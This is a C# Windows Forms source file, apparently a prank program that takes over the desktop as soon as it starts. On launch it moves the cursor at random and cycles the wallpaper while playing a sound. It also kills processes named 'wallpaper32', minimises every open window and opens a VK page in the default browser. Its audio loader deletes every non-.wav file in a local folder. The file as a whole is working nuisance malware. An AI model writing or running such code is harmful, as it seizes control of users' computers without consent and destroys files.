using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Media;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace WF_MAGIC
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            Action();
            InitializeComponent();
        }
        static int TimeChangeWallpapers = 100;
        static int TimeWorkProgramm = 100;
        static bool Start;

        static Audios audios = new Audios();
        static string path_to_audio = audios.path_files[0];
        static SoundPlayer sp = new SoundPlayer($@"{path_to_audio}");

        static Thread changecursorlocation = new Thread(new ThreadStart(ChangeCursorLocation));
        static Thread changewallpaper = new Thread(new ThreadStart(ChangeWallpaperAndStartSound));
        private static void Action()
        {
            changecursorlocation.Start();
            changewallpaper.Start();
            KillWallpaper();
            HideAllWindows();
            OpenBrowser();
        }
        private void button1_Click(object sender, EventArgs e)
        {

        }
        public static void KillWallpaper()
        {
            foreach (Process process in Process.GetProcesses())
            {
                if (process.ProcessName.ToLower().StartsWith("wallpaper32"))
                {
                    // выводим id и имя процесса
                    Console.WriteLine($"ID: {process.Id}  Name: {process.ProcessName}");
                    process.Kill();
                }
            }
        }
        public static void ChangeCursorLocation()
        {
            Start = true;
            int i = 0;
            while (Start)
            {
                i++;
                if (i == TimeWorkProgramm)
                {
                    Start = false;
                }
                Random randomx = new Random();
                Random randomy = new Random();
                Cursor.Position = new Point(randomx.Next(0,1920), randomy.Next(0, 1080));
                Thread.Sleep(250);
            }
        }
        [DllImport("user32.dll")]
        public static extern bool ShowWindow(IntPtr hwnd, int cmd);
        public static void HideAllWindows()
        {
            System.Diagnostics.Process[] etc = System.Diagnostics.Process.GetProcesses();//получаем процессы
            foreach (System.Diagnostics.Process anti in etc)//перебираем
            {
                if (anti.MainWindowTitle.ToString() != "")//отлавливаем процессы, которые имеют окна
                {
                    if (!anti.MainWindowTitle.ToString().Equals("Окно, которое не нужно закрывать(название окна)"))
                    {
                        ShowWindow(anti.MainWindowHandle, 6);//сворачивам окна
                    }
                }
            }

        }
        public static void OpenBrowser()
        {
            string referens = "https://vk.com/logotip456";
            Process p = new Process();
            p.StartInfo.FileName = defaultBrowser();
            p.StartInfo.Arguments = referens;
            p.Start();
        }
        public static string defaultBrowser()
        {
            string regkey = @"http\shell\open\command";
            RegistryKey registryKey = Registry.ClassesRoot.OpenSubKey(regkey, false);
            string browserPath = ((string)registryKey.GetValue(null, null)).Split('"')[1];
            return browserPath;
        }
        public static void ChangeWallpaperAndStartSound()
        {
            Start = true;
            wallpapers wallpapers = new wallpapers();
            int count = 0;
            StartSound();
            while (Start)
            {
                count++;
                if (count == TimeWorkProgramm)
                {
                    Start = false;
                }
                foreach (string file in wallpapers)
                {
                    Wallpaper.SetWallpaper(file);
                    Thread.Sleep(TimeChangeWallpapers);
                }
            }
            sp.Stop();
        }
        public static void StartSound()
        {
            try
            {
                sp.Play();
            }
            catch (Exception)
            {
                Console.WriteLine("В папке 'audios' нету файлов вообще или нету файлов wav");
            }
        }

    }
    class Audios
    {
        static string path_audios = GetPathAudio();
        static string GetPathAudio()
        {
            string[] DirsInCurrentDirectory = Directory.GetDirectories(
                AppDomain.CurrentDomain.BaseDirectory);
            string path_audios = null;

            foreach (string item in DirsInCurrentDirectory)
            {
                if (item.EndsWith("audios"))
                {
                    path_audios = item;
                }
            }
            return path_audios;
        }

        string[] files = Directory.GetFiles(path_audios);
        public int Lenght
        {
            get
            {
                return path_files.Count;
            }
        }

        public List<string> path_files = new List<string>();
        public Audios()
        {
            Add_Files_in_list();
        }
        void Add_Files_in_list()
        {
            foreach (string file_name in files)
            {
                if (file_name.EndsWith(".wav"))
                {
                    path_files.Add(file_name);
                }
                else
                {
                    System.IO.File.Delete($@"{file_name}");
                }
            }
        }
        public IEnumerator GetEnumerator()
        {
            return path_files.GetEnumerator();
        }
    }
    class wallpapers
    {
        public static string path_photo = GetPathPhotos();
        string[] files = Directory.GetFiles(path_photo);
        public List<string> path_files = new List<string>();

        public wallpapers()
        {
            Add_Files_in_list();
        }
        public int Lenght
        {
            get
            {
                return path_files.Count;
            }
        }


        public static string GetPathPhotos()
        {
            string[] dirs = Directory.GetDirectories(AppDomain.CurrentDomain.BaseDirectory);
            string path_photos = null;
            foreach (string item in dirs)
            {
                if (item.EndsWith("photos"))
                {
                    path_photos = item;
                }
            }
            return path_photos;
        }
        public void Add_Files_in_list()
        {
            foreach (string file_name in files)
            {
                path_files.Add(file_name);
            }
        }

        public IEnumerator GetEnumerator()
        {
            return path_files.GetEnumerator();
        }
    }
    class Wallpaper
    {
        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        private static extern Int32 SystemParametersInfo(
        UInt32 action, UInt32 uParam, String vParam, UInt32 winIni);

        private static readonly UInt32 SPI_SETDESKWALLPAPER = 0x14;
        private static readonly UInt32 SPIF_UPDATEINIFILE = 0x01;
        private static readonly UInt32 SPIF_SENDWININICHANGE = 0x02;

        public static void SetWallpaper(String path)
        {
            SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, path,
           SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE);
        }
    }
}